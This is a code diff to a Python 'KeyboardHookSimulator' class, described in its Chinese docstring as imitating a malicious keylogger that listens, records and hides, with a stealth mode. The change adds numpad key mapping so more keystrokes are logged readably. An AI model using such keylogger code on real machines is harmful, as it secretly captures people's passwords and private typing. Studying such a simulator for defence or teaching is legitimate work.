@@ -33,6 +33,14 @@ class KeyboardHookSimulator:
     模拟恶意键盘记录器的行为：监听、记录、藏起来
     """
 
+    # 小键盘虚拟键码 → 可读字符
+    NUMPAD_VK_MAP = {
+        96: '0', 97: '1', 98: '2', 99: '3', 100: '4',
+        101: '5', 102: '6', 103: '7', 104: '8', 105: '9',
+        106: '*', 107: '+', 108: '|',  # VK_SEPARATOR
+        109: '-', 110: '.', 111: '/',
+    }
+
     def __init__(self, stealth_mode=True):
         self.stealth_mode = stealth_mode
         self.running = False
@@ -46,7 +54,20 @@ class KeyboardHookSimulator:
         try:
             char = key.char
         except AttributeError:
-            char = str(key)
+            char = None
+
+        # 小键盘键通常没有 .char，用虚拟键码映射
+        if char is None:
+            try:
+                vk = key.vk
+            except AttributeError:
+                vk = None
+            if vk is not None and vk in self.NUMPAD_VK_MAP:
+                char = f'[小键盘 {self.NUMPAD_VK_MAP[vk]}]'
+            elif hasattr(key, 'name') and key.name:
+                char = f'<{key.name}>'
+            else:
+                char = str(key)
 
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
 
